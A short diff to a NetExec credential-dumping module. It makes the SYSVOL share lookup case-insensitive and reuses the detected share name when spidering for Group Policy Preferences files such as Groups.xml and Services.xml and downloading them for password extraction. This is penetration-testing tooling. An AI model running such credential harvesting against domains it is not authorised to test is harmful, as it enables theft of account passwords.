@@ -18,17 +18,18 @@ class NXCModule:
     category = CATEGORY.CREDENTIAL_DUMPING
 
     def options(self, context, module_options):
-        """ """
+        """No options available"""
 
     def on_login(self, context, connection):
         shares = connection.shares()
         for share in shares:
-            if share["name"] == "SYSVOL" and "READ" in share["access"]:
+            if share["name"].lower() == "sysvol" and "READ" in share["access"]:
+                sysvol = share["name"]
                 context.log.success("Found SYSVOL share")
                 context.log.display("Searching for potential XML files containing passwords")
 
                 paths = connection.spider(
-                    "SYSVOL",
+                    sysvol,
                     pattern=[
                         "Groups.xml",
                         "Services.xml",
@@ -43,7 +44,7 @@ class NXCModule:
                     context.log.display(f"Found {path}")
 
                     buf = BytesIO()
-                    connection.conn.getFile("SYSVOL", path, buf.write)
+                    connection.conn.getFile(sysvol, path, buf.write)
                     xml = ET.fromstring(buf.getvalue())
                     sections = []
 
